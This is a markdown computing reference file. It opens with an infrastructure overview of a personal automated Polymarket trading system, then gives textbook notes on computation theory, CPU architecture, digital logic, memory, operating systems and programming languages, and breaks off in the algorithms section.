# COMPUTING KNOWLEDGE
## Complete Earth Computing Reference

*All of humanity's computing knowledge - breadth and depth*

---

# INTEGRAFIX: HANDS-OFF SYSTEM INFRASTRUCTURE

> Computing knowledge applied to **Yair Siegel's** Hands-Off Engine.
> This system runs on real infrastructure that costs real money.

## System Infrastructure
| Component | Details | Cost |
|-----------|---------|------|
| **Main Server** | DigitalOcean droplet | ~$12/mo |
| **Termux** | Pixel 6a Android | $0 (owned) |
| **Polygon RPC** | Polymarket trading | Gas in MATIC |
| **AI APIs** | Claude/GPT/etc | ~$250/mo budget |

## System Integration Points
| Component | Location | Purpose |
|-----------|----------|---------|
| **Main KB** | `KNOWLEDGE.md` | System overview |
| **Infra Manager** | `autonomous/infra_manager.py` | Server management |
| **Hardware Brain** | `hardware/hardware_brain.py` | Infrastructure decisions |
| **Self Healer** | `autonomous/self_healer.py` | Auto-fix issues |
| **Backend Loop** | `autonomous/backend_loop.py` | Main orchestrator (SACRED) |

## Sacred Processes (NEVER KILL)
```
backend_loop.py      - Main orchestrator
hardware_brain.py    - Infrastructure
scaling_engine.py    - Auto-scaling
infra_manager.py     - Infra monitoring
self_healer.py       - Self-healing
```

## How Computing KB Connects
```
Computing Knowledge → Distributed Systems → Backend Architecture
        ↓
Networking → API design → Polymarket CLOB integration
        ↓
Security → Wallet safety → Trading protection
        ↓
AI/ML → Fair price estimation → Trading edge
```

## Key Computing for Hands-Off
1. **Distributed Systems**: Backend loop runs across Termux + DO
2. **API Design**: py_clob_client for Polymarket
3. **Security**: Wallet private key protection
4. **Cron Jobs**: 18+ scheduled tasks
5. **Self-Healing**: Detect and fix failures automatically

---

# TABLE OF CONTENTS

1. [Nature of Computation](#1-nature-of-computation)
2. [Computer Architecture](#2-computer-architecture)
3. [Digital Logic & Circuits](#3-digital-logic--circuits)
4. [Memory Systems](#4-memory-systems)
5. [Operating Systems](#5-operating-systems)
6. [Programming Languages](#6-programming-languages)
7. [Algorithms](#7-algorithms)
8. [Data Structures](#8-data-structures)
9. [Networking](#9-networking)
10. [Distributed Systems](#10-distributed-systems)
11. [Databases](#11-databases)
12. [Security & Cryptography](#12-security--cryptography)
13. [Artificial Intelligence](#13-artificial-intelligence)
14. [Machine Learning](#14-machine-learning)
15. [Software Engineering](#15-software-engineering)
16. [Computer Graphics](#16-computer-graphics)
17. [Human-Computer Interaction](#17-human-computer-interaction)
18. [Compilers & Language Processing](#18-compilers--language-processing)
19. [Parallel & Concurrent Computing](#19-parallel--concurrent-computing)
20. [Emerging Computing Paradigms](#20-emerging-computing-paradigms)

---

# 1. NATURE OF COMPUTATION

## 1.1 What is Computation?

**Computation** is the systematic transformation of information according to well-defined rules. At its core, computation is about:

- **Input**: Information entering a system
- **Process**: Transformation according to rules
- **Output**: Results of transformation
- **State**: Memory of intermediate results

### The Church-Turing Thesis

Any computable function can be computed by a Turing machine. This fundamental insight establishes:

1. **Universality**: One machine can simulate any other
2. **Limits**: Some problems are fundamentally uncomputable
3. **Equivalence**: All sufficiently powerful computing models are equivalent

## 1.2 Computational Models

### Turing Machine
```
Formal definition:
- Infinite tape divided into cells
- Head that reads/writes symbols
- Finite set of states
- Transition function: δ(state, symbol) → (new_state, new_symbol, direction)
```

**Key Properties**:
- Deterministic or non-deterministic
- Single or multi-tape variants
- Universal Turing Machine can simulate any TM

### Lambda Calculus
```
Core syntax:
- Variables: x, y, z
- Abstraction: λx.M (function definition)
- Application: M N (function call)

Reduction rules:
- α-conversion: λx.M → λy.M[x:=y]
- β-reduction: (λx.M)N → M[x:=N]
- η-conversion: λx.Mx → M (if x not free in M)
```

### Other Models
- **Finite Automata**: Limited memory, regular languages
- **Pushdown Automata**: Stack memory, context-free languages
- **Cellular Automata**: Grid-based parallel computation
- **Register Machines**: Closer to real computers
- **Quantum Computing**: Superposition and entanglement

## 1.3 Computability Theory

### Decidable Problems
Problems where an algorithm always halts with YES/NO:
- Primality testing
- Graph connectivity
- Regular expression matching

### Undecidable Problems
Problems with no algorithm that always halts:
- **Halting Problem**: Does program P halt on input I?
- **Post Correspondence Problem**
- **Entscheidungsproblem**: Is formula F provable?

### Semi-decidable (Recursively Enumerable)
- Algorithm halts and says YES if answer is YES
- May run forever if answer is NO

## 1.4 Information Theory

### Shannon Entropy
```
H(X) = -Σ p(x) log₂ p(x)

Measures: Average bits needed to encode a message
Maximum: log₂(n) for n equally likely outcomes
Minimum: 0 for deterministic outcomes
```

### Key Concepts
- **Mutual Information**: I(X;Y) = H(X) - H(X|Y)
- **Channel Capacity**: Maximum reliable transmission rate
- **Data Compression**: Entropy sets theoretical minimum
- **Error Correction**: Redundancy enables recovery

### Kolmogorov Complexity
```
K(x) = length of shortest program that outputs x

Properties:
- Uncomputable in general
- Incompressible strings exist
- K(x) ≤ |x| + c for all x
```

---

# 2. COMPUTER ARCHITECTURE

## 2.1 Von Neumann Architecture

The foundation of nearly all modern computers:

```
┌─────────────────────────────────────────────────┐
│                    CPU                           │
│  ┌─────────┐  ┌─────────┐  ┌─────────────────┐ │
│  │  ALU    │  │ Control │  │   Registers     │ │
│  │         │  │  Unit   │  │ PC, IR, ACC,... │ │
│  └─────────┘  └─────────┘  └─────────────────┘ │
└───────────────────┬─────────────────────────────┘
                    │ System Bus
        ┌───────────┼───────────┐
        ▼           ▼           ▼
    ┌───────┐   ┌───────┐   ┌───────┐
    │Memory │   │  I/O  │   │  I/O  │
    │       │   │Device │   │Device │
    └───────┘   └───────┘   └───────┘
```

### Key Principles
1. **Stored Program**: Instructions in same memory as data
2. **Sequential Execution**: One instruction at a time (logically)
3. **Single Memory**: Unified address space
4. **Binary Representation**: All information in bits

### The Von Neumann Bottleneck
- CPU faster than memory
- Memory bandwidth limits performance
- Solutions: caches, parallelism, out-of-order execution

## 2.2 CPU Architecture

### Instruction Cycle
```
1. FETCH:    IR ← Memory[PC]
2. DECODE:   Determine operation and operands
3. EXECUTE:  Perform operation
4. WRITEBACK: Store results
5. PC ← PC + instruction_length
```

### CPU Components

**Arithmetic Logic Unit (ALU)**:
- Integer arithmetic (+, -, ×, ÷)
- Bitwise operations (AND, OR, XOR, NOT, shifts)
- Comparison operations
- Floating-point unit (FPU) for real numbers

**Control Unit**:
- Instruction decoder
- Timing and sequencing
- Control signal generation
- Pipeline management

**Registers**:
| Type | Purpose |
|------|---------|
| PC (Program Counter) | Address of next instruction |
| IR (Instruction Register) | Current instruction |
| MAR (Memory Address Register) | Memory address to access |
| MDR (Memory Data Register) | Data read/written |
| ACC (Accumulator) | Computation results |
| General Purpose | User data (R0-R31, etc.) |
| Stack Pointer | Top of stack |
| Status Register | Flags (zero, carry, overflow) |

### Instruction Set Architecture (ISA)

**CISC (Complex Instruction Set Computer)**:
- Many specialized instructions
- Variable-length instructions
- Memory operands common
- Examples: x86, x86-64

**RISC (Reduced Instruction Set Computer)**:
- Simple, uniform instructions
- Fixed-length encoding
- Load/store architecture
- Examples: ARM, RISC-V, MIPS

**Comparison**:
```
CISC: mov [ebx+4*ecx], eax   ; Single complex instruction
RISC: sll  t1, t2, 2          ; Shift left by 2
      add  t1, t1, t3         ; Add base
      sw   t0, 0(t1)          ; Store word
```

## 2.3 Pipelining

Transform sequential execution into parallel:

```
Time →
Instruction 1: [F][D][E][M][W]
Instruction 2:    [F][D][E][M][W]
Instruction 3:       [F][D][E][M][W]
Instruction 4:          [F][D][E][M][W]

F=Fetch, D=Decode, E=Execute, M=Memory, W=Writeback
```

### Pipeline Hazards

**Data Hazards**:
```assembly
add r1, r2, r3    ; r1 = r2 + r3
sub r4, r1, r5    ; r4 = r1 - r5  (needs r1!)

Solutions:
- Forwarding/Bypassing
- Stalling (NOP insertion)
- Compiler scheduling
```

**Control Hazards**:
```assembly
beq r1, r2, target  ; Branch if equal
add r3, r4, r5      ; Execute or not?

Solutions:
- Branch prediction
- Branch delay slots
- Speculative execution
```

**Structural Hazards**:
- Resource conflicts
- Solutions: Duplicate hardware, scheduling

### Branch Prediction

**Static Prediction**:
- Always taken / not taken
- Backward taken, forward not taken

**Dynamic Prediction**:
```
1-bit predictor: Last outcome predicts next
2-bit predictor: Saturating counter (00-01-10-11)
Tournament predictor: Multiple predictors compete
Neural branch prediction: Pattern learning
```

## 2.4 Superscalar & Out-of-Order

### Superscalar Execution
Multiple instructions per cycle:
```
Cycle 1: [add r1,r2,r3] [mul r4,r5,r6]
Cycle 2: [sub r7,r8,r9] [div r10,r11,r12]
```

### Out-of-Order Execution (Tomasulo's Algorithm)
```
1. Issue: Decode, rename registers, dispatch to reservation stations
2. Execute: When operands ready, execute
3. Write Result: Broadcast on Common Data Bus
4. Commit: In-order retirement for precise exceptions

Key structures:
- Reservation Stations: Hold pending operations
- Reorder Buffer (ROB): Track in-flight instructions
- Register Alias Table: Map logical to physical registers
```

### Modern CPU Features
- **SIMD**: Single Instruction Multiple Data (SSE, AVX, NEON)
- **SMT**: Simultaneous Multithreading (Hyper-Threading)
- **Speculative Execution**: Execute before knowing if needed
- **Prefetching**: Anticipate memory accesses

## 2.5 Memory Hierarchy

```
┌─────────────┐  Fastest, smallest, most expensive
│  Registers  │  < 1 KB, < 1 ns
├─────────────┤
│  L1 Cache   │  32-64 KB, 1-2 ns
├─────────────┤
│  L2 Cache   │  256 KB - 1 MB, 3-10 ns
├─────────────┤
│  L3 Cache   │  4-64 MB, 10-20 ns
├─────────────┤
│    RAM      │  4-128 GB, 50-100 ns
├─────────────┤
│    SSD      │  256 GB - 8 TB, 10-100 μs
├─────────────┤
│    HDD      │  1-20 TB, 5-10 ms
├─────────────┤
│   Tape      │  Petabytes, seconds-minutes
└─────────────┘  Slowest, largest, cheapest
```

### Cache Principles

**Locality**:
- **Temporal**: Recently used → likely used again
- **Spatial**: Nearby addresses → likely accessed together

**Cache Organization**:
```
Address: [Tag | Index | Offset]

Direct Mapped:     One location per block
Set Associative:   N locations per block (N-way)
Fully Associative: Any location (expensive)
```

**Replacement Policies**:
- LRU (Least Recently Used)
- FIFO (First In First Out)
- Random
- Pseudo-LRU (tree-based approximation)

**Write Policies**:
- Write-through: Update cache and memory
- Write-back: Update cache, memory on eviction

---

# 3. DIGITAL LOGIC & CIRCUITS

## 3.1 Boolean Algebra

### Basic Gates
```
NOT:  Y = Ā           ─┬─○─
AND:  Y = A·B         ─┬─D──
OR:   Y = A+B         ─┬─D──
NAND: Y = (A·B)̄       ─┬─D○─  (Universal)
NOR:  Y = (A+B)̄       ─┬─D○─  (Universal)
XOR:  Y = A⊕B         ─┬─)──
XNOR: Y = A⊙B         ─┬─)○─
```

### Boolean Laws
```
Identity:     A·1 = A,  A+0 = A
Null:         A·0 = 0,  A+1 = 1
Idempotent:   A·A = A,  A+A = A
Inverse:      A·Ā = 0,  A+Ā = 1
Commutative:  A·B = B·A
Associative:  (A·B)·C = A·(B·C)
Distributive: A·(B+C) = A·B + A·C
              A+(B·C) = (A+B)·(A+C)
De Morgan:    (A·B)̄ = Ā+B̄
              (A+B)̄ = Ā·B̄
```

### Canonical Forms
```
Sum of Products (SOP): F = Σm(1,3,5,7)
Product of Sums (POS): F = ΠM(0,2,4,6)

Karnaugh Maps for minimization:
      AB
   00 01 11 10
C 0│ 0  1  1  0 │
  1│ 0  1  1  0 │

Group adjacent 1s → F = B
```

## 3.2 Combinational Circuits

### Multiplexer (MUX)
```
2:1 MUX: Y = S̄·A + S·B

       ┌────┐
A ────>│    │
B ────>│MUX │───> Y
S ────>│    │
       └────┘

4:1 MUX: Y = S̄₁S̄₀A + S̄₁S₀B + S₁S̄₀C + S₁S₀D
```

### Decoder
```
2:4 Decoder:
Input:  A₁A₀
Output: D₀=Ā₁Ā₀, D₁=Ā₁A₀, D₂=A₁Ā₀, D₃=A₁A₀
```

### Adder Circuits
```
Half Adder:
  Sum = A ⊕ B
  Carry = A · B

Full Adder:
  Sum = A ⊕ B ⊕ Cin
  Cout = (A·B) + (Cin·(A⊕B))

Ripple Carry: Chain full adders (slow, O(n))
Carry Lookahead: Parallel carry computation (fast, O(log n))
```

### Arithmetic Logic Unit (ALU)
```
Inputs: A, B (operands), Op (operation select)
Outputs: Result, Flags (Zero, Carry, Overflow, Negative)

Operations via Op:
000: A + B
001: A - B
010: A AND B
011: A OR B
100: A XOR B
101: A << 1
110: A >> 1
111: NOT A
```

## 3.3 Sequential Circuits

### Latches and Flip-Flops

**SR Latch**:
```
S R │ Q Q̄
0 0 │ Q Q̄  (Hold)
0 1 │ 0 1  (Reset)
1 0 │ 1 0  (Set)
1 1 │ ? ?  (Invalid)
```

**D Flip-Flop** (Edge-triggered):
```
On rising clock edge: Q ← D

    ┌───┐
D ──│   │── Q
    │ D │
CLK─│>  │── Q̄
    └───┘
```

**JK Flip-Flop**:
```
J K │ Q(next)
0 0 │ Q      (Hold)
0 1 │ 0      (Reset)
1 0 │ 1      (Set)
1 1 │ Q̄      (Toggle)
```

### Registers
```
n-bit Register: n D flip-flops with common clock
Shift Register: Serial in, parallel out (or reverse)
Counter: Sequential state machine
```

### Finite State Machines

**Moore Machine**: Output depends only on state
**Mealy Machine**: Output depends on state and input

```
State Diagram for 2-bit counter:
    ┌──────┐   ┌──────┐
    │  00  │──>│  01  │
    └──────┘   └──────┘
        ↑           │
        │           ▼
    ┌──────┐   ┌──────┐
    │  11  │<──│  10  │
    └──────┘   └──────┘
```

## 3.4 Hardware Description Languages

### Verilog
```verilog
module counter(
    input clk, reset,
    output reg [3:0] count
);
    always @(posedge clk or posedge reset) begin
        if (reset)
            count <= 4'b0000;
        else
            count <= count + 1;
    end
endmodule
```

### VHDL
```vhdl
library IEEE;
use IEEE.STD_LOGIC_1164.ALL;
use IEEE.NUMERIC_STD.ALL;

entity counter is
    Port ( clk, reset : in STD_LOGIC;
           count : out STD_LOGIC_VECTOR(3 downto 0));
end counter;

architecture Behavioral of counter is
    signal cnt : unsigned(3 downto 0) := "0000";
begin
    process(clk, reset)
    begin
        if reset = '1' then
            cnt <= "0000";
        elsif rising_edge(clk) then
            cnt <= cnt + 1;
        end if;
    end process;
    count <= std_logic_vector(cnt);
end Behavioral;
```

---

# 4. MEMORY SYSTEMS

## 4.1 Memory Technologies

### SRAM (Static RAM)
```
Structure: 6 transistors per bit
Speed: Very fast (< 1ns)
Power: Low static power
Cost: Expensive
Use: CPU caches, registers
Volatile: Yes
```

### DRAM (Dynamic RAM)
```
Structure: 1 transistor + 1 capacitor per bit
Speed: Moderate (50-100ns)
Power: Requires refresh (every 64ms)
Cost: Inexpensive
Use: Main memory
Volatile: Yes

Refresh: Capacitor charge leaks, must periodically read and rewrite
```

### Flash Memory
```
Types:
- NOR Flash: Random access, code storage
- NAND Flash: Block access, data storage

Characteristics:
- Non-volatile
- Limited write cycles (1K-100K)
- Read faster than write
- Erase before write (blocks)

Modern NAND:
- SLC: 1 bit/cell, fastest, most durable
- MLC: 2 bits/cell, moderate
- TLC: 3 bits/cell, dense, slower
- QLC: 4 bits/cell, densest, slowest
```

### Emerging Memory
- **MRAM**: Magnetic, non-volatile, fast
- **ReRAM**: Resistive switching
- **PCM**: Phase-change material
- **FRAM**: Ferroelectric

## 4.2 Memory Organization

### Address Space
```
32-bit: 4 GB addressable (2³² bytes)
64-bit: 16 EB addressable (2⁶⁴ bytes)

Word alignment:
- 32-bit word at address divisible by 4
- 64-bit word at address divisible by 8
```

### Endianness
```
Value: 0x12345678

Big Endian (MSB first):
Address: 0x00  0x01  0x02  0x03
Value:   0x12  0x34  0x56  0x78

Little Endian (LSB first):
Address: 0x00  0x01  0x02  0x03
Value:   0x78  0x56  0x34  0x12
```

### Memory Interleaving
```
Without interleaving:
Bank 0: [0][1][2][3][4][5][6][7]

4-way interleaving:
Bank 0: [0][4][8]...
Bank 1: [1][5][9]...
Bank 2: [2][6][10]...
Bank 3: [3][7][11]...

Benefit: Parallel access to consecutive addresses
```

## 4.3 Virtual Memory

### Concept
```
Virtual Address Space (per process):
┌─────────────┐ 0xFFFFFFFF
│   Kernel    │
├─────────────┤
│   Stack     │ ↓ grows down
│      ↓      │
│             │
│      ↑      │
│   Heap      │ ↑ grows up
├─────────────┤
│    BSS      │ Uninitialized data
├─────────────┤
│    Data     │ Initialized data
├─────────────┤
│    Text     │ Code
└─────────────┘ 0x00000000
```

### Page Tables
```
Virtual Address: [VPN | Offset]
                    ↓
              Page Table
                    ↓
Physical Address: [PFN | Offset]

Page Table Entry (PTE):
[PFN | Valid | Read | Write | Execute | Dirty | Accessed]
```

### Translation Lookaside Buffer (TLB)
```
Hardware cache for page table entries
Hit: Virtual → Physical in 1 cycle
Miss: Page table walk (multiple memory accesses)

Typical size: 64-1024 entries
Typical hit rate: 99%+
```

### Multi-level Page Tables
```
64-bit Linux (4-level):
Virtual Address: [PML4 | PDPT | PD | PT | Offset]
                  9 bits 9 bits 9 bits 9 bits 12 bits

Each level indexes into a table of 512 entries
Saves space: Only allocate tables as needed
```

### Demand Paging
```
1. Access unmapped page
2. Page fault exception
3. OS finds page on disk (swap)
4. OS loads page into physical frame
5. OS updates page table
6. Retry instruction

Page Replacement Algorithms:
- FIFO: Replace oldest page
- LRU: Replace least recently used
- Clock: Circular queue with use bits
- Working Set: Keep recently used pages
```

---

# 5. OPERATING SYSTEMS

## 5.1 OS Fundamentals

### What is an OS?
```
User Applications
        ↓
┌─────────────────────────────────────┐
│         Operating System            │
│  ┌─────┐ ┌─────┐ ┌─────┐ ┌─────┐  │
│  │File │ │Proc │ │Mem  │ │ I/O │  │
│  │Sys  │ │Mgmt │ │Mgmt │ │Mgmt │  │
│  └─────┘ └─────┘ └─────┘ └─────┘  │
│           Kernel                    │
└─────────────────────────────────────┘
        ↓
    Hardware
```

**Core Functions**:
1. **Process Management**: Create, schedule, terminate processes
2. **Memory Management**: Allocate, protect, virtual memory
3. **File Systems**: Organize, store, retrieve data
4. **I/O Management**: Device drivers, buffering
5. **Security**: Access control, protection

### Kernel Architectures

**Monolithic Kernel**:
```
All services in kernel space
Examples: Linux, FreeBSD
Pros: Fast (no IPC overhead)
Cons: Large, complex, crash = system crash
```

**Microkernel**:
```
Minimal kernel, services in user space
Examples: Minix, QNX, seL4
Pros: Robust, modular
Cons: IPC overhead
```

**Hybrid**:
```
Monolithic with modular features
Examples: Windows NT, macOS (XNU)
```

## 5.2 Process Management

### Process States
```
       ┌─────────────────────────────────────┐
       │                                     │
       ▼                                     │
    ┌─────┐  schedule   ┌─────────┐  wait   ┌──────────┐
    │ New │────────────>│ Running │────────>│ Blocked  │
    └─────┘             └─────────┘         └──────────┘
       │                     │                   │
       │     preempt/yield   │     event         │
       │                     ▼     complete      │
       │                ┌─────────┐              │
       │                │  Ready  │<─────────────┘
       │                └─────────┘
       │                     │
       │                     ▼
       │               ┌────────────┐
       └──────────────>│ Terminated │
                       └────────────┘
```

### Process Control Block (PCB)
```
struct pcb {
    pid_t pid;              // Process ID
    int state;              // Current state
    int priority;           // Scheduling priority
    void *pc;               // Program counter
    registers regs;         // CPU register state
    void *page_table;       // Memory mapping
    int files[MAX_FILES];   // Open file descriptors
    pid_t parent;           // Parent process
    list_t children;        // Child processes
    // ... more fields
};
```

### Context Switch
```
1. Save current process state (registers, PC, SP)
2. Update PCB in process table
3. Move process to appropriate queue
4. Select next process
5. Update memory management (page tables)
6. Restore new process state
7. Jump to new PC

Cost: 1-10 microseconds (depends on architecture)
```

### Scheduling Algorithms

**First Come First Served (FCFS)**:
```
Non-preemptive
Simple queue
Problem: Convoy effect
```

**Shortest Job First (SJF)**:
```
Non-preemptive variant
Optimal for average wait time
Problem: Requires knowing job length
```

**Round Robin (RR)**:
```
Time quantum (e.g., 10ms)
Preemptive
Fair distribution of CPU
Problem: Context switch overhead
```

**Priority Scheduling**:
```
Each process has priority
Can be preemptive or not
Problem: Starvation
Solution: Aging (increase priority over time)
```

**Multilevel Feedback Queue**:
```
Multiple queues with different priorities
Processes move between queues based on behavior
CPU-bound → lower priority
I/O-bound → higher priority
```

**Completely Fair Scheduler (Linux CFS)**:
```
Red-black tree sorted by virtual runtime
Always runs process with smallest vruntime
vruntime increases slower for higher priority
O(log n) operations
```

## 5.3 Threads

### Thread vs Process
```
Process:
- Own address space
- Own resources (files, etc.)
- Heavyweight
- Isolated

Thread:
- Shared address space
- Shared resources
- Lightweight
- Communicate via shared memory
```

### User-level vs Kernel Threads
```
User-level (Green threads):
- Managed by runtime
- Fast context switch
- One kernel thread per process
- Can't use multiple CPUs

Kernel-level:
- Managed by OS
- Slower context switch
- True parallelism
- System calls per thread

Hybrid (M:N):
- M user threads on N kernel threads
- Best of both worlds
- Complex implementation
```

### Thread Synchronization

**Mutex (Mutual Exclusion)**:
```c
pthread_mutex_t mutex;

pthread_mutex_lock(&mutex);
// Critical section
pthread_mutex_unlock(&mutex);
```

**Semaphore**:
```c
sem_t sem;
sem_init(&sem, 0, N);  // N resources

sem_wait(&sem);   // P operation (decrement)
// Use resource
sem_post(&sem);   // V operation (increment)
```

**Condition Variable**:
```c
pthread_cond_wait(&cond, &mutex);   // Wait for signal
pthread_cond_signal(&cond);          // Wake one waiter
pthread_cond_broadcast(&cond);       // Wake all waiters
```

**Read-Write Lock**:
```
Multiple readers OR one writer
Readers don't block readers
Writer blocks everyone
```

## 5.4 Synchronization Problems

### Deadlock
```
Four necessary conditions (Coffman):
1. Mutual Exclusion: Resources not shareable
2. Hold and Wait: Hold resources while waiting
3. No Preemption: Can't take resources away
4. Circular Wait: Circular chain of waiting

Prevention: Break any condition
Detection: Resource allocation graph
Recovery: Kill process or preempt resource
```

### Classic Problems

**Producer-Consumer**:
```
Producer creates items
Consumer uses items
Bounded buffer between them
Synchronize: Don't overflow, don't read empty
```

**Readers-Writers**:
```
Multiple readers can read simultaneously
Writers need exclusive access
Variants: Reader preference, writer preference, fair
```

**Dining Philosophers**:
```
N philosophers, N forks
Need 2 forks to eat
Problem: All grab left fork → deadlock
Solution: Order forks, or limit concurrent eaters
```

## 5.5 File Systems

### File Abstraction
```
File: Named collection of bytes
Directory: Container of files and subdirectories
Path: Location in hierarchy (/home/user/file.txt)

Operations:
- open(), close()
- read(), write()
- seek(), stat()
- mkdir(), rmdir()
- link(), unlink()
```

### Disk Layout
```
┌─────┬───────────┬────────────┬───────────────┐
│Boot │Superblock │  Inodes    │  Data Blocks  │
│Block│           │            │               │
└─────┴───────────┴────────────┴───────────────┘
```

### Inode Structure
```
struct inode {
    mode_t mode;          // Permissions
    uid_t uid, gid_t gid; // Owner
    size_t size;          // File size
    time_t atime, mtime;  // Access, modify time
    block_t direct[12];   // Direct block pointers
    block_t indirect;     // Single indirect
    block_t double_ind;   // Double indirect
    block_t triple_ind;   // Triple indirect
};
```

### File Systems Comparison
```
| FS     | Max File | Max Volume | Features          |
|--------|----------|------------|-------------------|
| FAT32  | 4 GB     | 2 TB       | Simple, portable  |
| NTFS   | 16 EB    | 16 EB      | ACLs, journaling  |
| ext4   | 16 TB    | 1 EB       | Journaling, extents|
| XFS    | 8 EB     | 8 EB       | Large files, fast |
| ZFS    | 16 EB    | 256 ZB     | Checksums, pools  |
| Btrfs  | 16 EB    | 16 EB      | CoW, snapshots    |
```

### Journaling
```
Write-ahead logging:
1. Write intended changes to journal
2. Apply changes to file system
3. Mark journal entry complete

Recovery: Replay uncommitted journal entries
```

---

# 6. PROGRAMMING LANGUAGES

## 6.1 Language Paradigms

### Imperative
```
Sequential statements that change state
Focus: How to do something

C example:
int sum = 0;
for (int i = 0; i < n; i++) {
    sum += array[i];
}
```

### Declarative
```
Describe what result you want
Focus: What you want

SQL example:
SELECT SUM(value) FROM table WHERE condition;

Haskell example:
sum = foldr (+) 0 list
```

### Object-Oriented
```
Encapsulation: Bundle data with methods
Inheritance: Derive from parent classes
Polymorphism: Same interface, different implementations

Python example:
class Animal:
    def speak(self): pass

class Dog(Animal):
    def speak(self): return "Woof"

class Cat(Animal):
    def speak(self): return "Meow"
```

### Functional
```
Pure functions: No side effects
Immutability: Data doesn't change
First-class functions: Functions as values
Higher-order functions: Functions on functions

Haskell example:
map :: (a -> b) -> [a] -> [b]
map f [] = []
map f (x:xs) = f x : map f xs
```

### Logic Programming
```
Define facts and rules
Query engine finds solutions

Prolog example:
parent(tom, mary).
parent(mary, john).
grandparent(X, Z) :- parent(X, Y), parent(Y, Z).

?- grandparent(tom, Who).
Who = john.
```

## 6.2 Type Systems

### Static vs Dynamic Typing
```
Static: Types checked at compile time
  - Java, C++, Rust, Haskell
  - Catch errors early
  - Better optimization

Dynamic: Types checked at runtime
  - Python, JavaScript, Ruby
  - More flexible
  - Faster development
```

### Strong vs Weak Typing
```
Strong: Few implicit conversions
  - Python: "3" + 4 → Error
  - Explicit conversion required

Weak: Many implicit conversions
  - JavaScript: "3" + 4 → "34"
  - Automatic coercion
```

### Type System Features
```
Generics/Parametric Polymorphism:
  List<T>, Vec<T>

Algebraic Data Types:
  data Maybe a = Nothing | Just a

Type Inference:
  let x = 5  // x inferred as int

Dependent Types:
  Vector n a  // Type depends on value n
```

## 6.3 Memory Management

### Manual (C/C++)
```c
int *p = malloc(sizeof(int) * 100);
// Use memory
free(p);
p = NULL;  // Avoid dangling pointer

Risks:
- Memory leaks
- Double free
- Use after free
- Buffer overflow
```

### Garbage Collection

**Reference Counting**:
```
Each object has count of references
When count = 0, free object
Problem: Circular references

Python/Swift use this + cycle detection
```

**Mark and Sweep**:
```
1. Mark: Trace from roots, mark reachable objects
2. Sweep: Free unmarked objects

Stop-the-world pauses
Used by many GC implementations
```

**Generational GC**:
```
Hypothesis: Most objects die young
Generations: Young → Old → Permanent
Collect young gen frequently (fast)
Collect old gen rarely (slow but rare)
Used by: JVM, .NET, V8
```

**Concurrent/Incremental GC**:
```
Run GC alongside application
Lower pause times
More complex implementation
Examples: G1 (Java), ZGC, Shenandoah
```

### Ownership (Rust)
```rust
fn main() {
    let s1 = String::from("hello");  // s1 owns string
    let s2 = s1;                      // Ownership moved to s2
    // println!("{}", s1);           // Error! s1 no longer valid

    let s3 = s2.clone();             // Deep copy

    takes_ownership(s2);              // s2 moved into function
    // s2 no longer valid

    let s4 = gives_ownership();       // Ownership transferred out
}

// Borrowing
fn calculate_length(s: &String) -> usize {
    s.len()  // Borrow, don't take ownership
}
```

## 6.4 Concurrency Models

### Shared Memory
```
Threads share address space
Synchronize with locks, atomics
Problems: Race conditions, deadlocks

pthread_mutex_lock(&lock);
shared_data++;
pthread_mutex_unlock(&lock);
```

### Message Passing
```
Processes communicate via messages
No shared state
Examples: Erlang, Go channels

Go example:
ch := make(chan int)
go func() { ch <- 42 }()
value := <-ch
```

### Actor Model
```
Actors: Independent units with state
Communication: Only via messages
No shared state between actors

Erlang/Elixir, Akka (Scala/Java)
```

### Async/Await
```
Concurrent execution without threads
Event loop manages execution
Non-blocking I/O

JavaScript:
async function fetchData() {
    const response = await fetch(url);
    const data = await response.json();
    return data;
}

Python:
async def fetch_data():
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as response:
            return await response.json()
```

## 6.5 Major Languages

### Systems Languages
```
C:
- Low-level control
- Manual memory management
- Unix, Linux kernel, embedded

C++:
- C with classes
- Zero-cost abstractions
- Games, high-performance

Rust:
- Memory safety without GC
- Ownership system
- Systems programming

Go:
- Simplicity
- Fast compilation
- Concurrency (goroutines)
- Cloud infrastructure
```

### Application Languages
```
Java:
- "Write once, run anywhere"
- JVM, garbage collected
- Enterprise, Android

C#:
- Microsoft's Java alternative
- .NET ecosystem
- Windows, Unity games

Python:
- Readability
- Dynamic typing
- Data science, scripting, web

JavaScript/TypeScript:
- Web browsers
- Node.js server-side
- Everything front-end
```

### Specialized Languages
```
R: Statistics
MATLAB: Numerical computing
Julia: Scientific computing
Scala: Functional + OOP on JVM
Kotlin: Modern Java alternative
Swift: Apple ecosystem
Ruby: Web development (Rails)
PHP: Server-side web
Perl: Text processing
Lua: Embedded scripting
```

### Functional Languages
```
Haskell: Pure functional, lazy
OCaml: ML family, pragmatic
F#: ML on .NET
Erlang: Distributed, fault-tolerant
Elixir: Modern Erlang
Clojure: Lisp on JVM
```

---

# 7. ALGORITHMS

## 7.1 Complexity Analysis

### Big-O Notation
```
O(1):       Constant      - Hash table lookup
O(log n):   Logarithmic   - Binary search
O(n):       Linear        - Array scan
O(n log n): Linearithmic  - Merge sort
O(n²):      Quadratic     - Nested loops
O(n³):      Cubic         - Matrix multiplication
O(2ⁿ):      Exponential   - Subset enumeration
O(n!):      Factorial     - Permutations
```

### Complexity Classes
```
P:     Solvable in polynomial time
NP:    Verifiable in polynomial time
NP-Complete: Hardest problems in NP
NP-Hard: At least as hard as NP-Complete

P vs NP: Open question (probably P ≠ NP)
```

### Amortized Analysis
```
Average cost over sequence of operations
Example: Dynamic array (ArrayList)
  - Most insertions: O(1)
  - Occasional resize: O(n)
  - Amortized: O(1) per insertion
```

## 7.2 Sorting Algorithms

### Comparison Sorts
```
Algorithm      | Best    | Average | Worst   | Space | Stable
---------------|---------|---------|---------|-------|-------
Bubble Sort    | O(n)    | O(n²)   | O(n²)   | O(1)  | Yes
Selection Sort | O(n²)   | O(n²)   | O(n²)   | O(1)  | No
Insertion Sort | O(n)    | O(n²)   | O(n²)   | O(1)  | Yes
Merge Sort     | O(n lg n)| O(n lg n)| O(n lg n)| O(n)  | Yes
Quick Sort     | O(n lg n)| O(n lg n)| O(n²)   | O(lg n)| No
Heap Sort      | O(n lg n)| O(n lg n)| O(n lg n)| O(1)  | No
Tim Sort       | O(n)    | O(n lg n)| O(n lg n)| O(n)  | Yes
```

### Non-Comparison Sorts
```
Counting Sort: O(n + k), k = range of values
Radix Sort:    O(d(n + k)), d = digits, k = base
Bucket Sort:   O(n + k), uniform distribution
```

### Sorting Implementations

**Quick Sort**:
```python
def quicksort(arr, lo, hi):
    if lo < hi:
        pivot = partition(arr, lo, hi)
